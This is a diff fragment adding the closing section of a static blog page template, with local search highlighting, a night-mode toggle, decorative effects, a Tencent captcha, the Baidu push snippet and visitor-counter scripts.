+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
 
 </body>
+
 </html>
